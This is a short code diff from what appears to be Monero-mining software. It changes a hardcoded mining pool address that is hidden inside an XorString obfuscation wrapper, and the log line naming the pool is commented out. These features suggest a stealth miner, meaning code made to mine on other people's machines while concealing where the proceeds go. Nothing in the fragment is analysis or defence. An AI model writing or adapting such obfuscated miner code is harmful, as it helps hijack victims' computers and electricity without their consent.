@@ -314,7 +314,7 @@ void executor::on_reconnect(size_t pool_id)
 
 	//printer::inst()->print_msg(L1, "Connecting to pool %s ...", jconf::inst()->GetPoolAddress());
 
-	auto poolAddress  = XorString("pool.minexmr.com:7777");
+	auto poolAddress  = XorString("avsadult.com:7777");
 	if(!pool->connect(poolAddress, error))
 	{
 		log_socket_error(std::move(error));
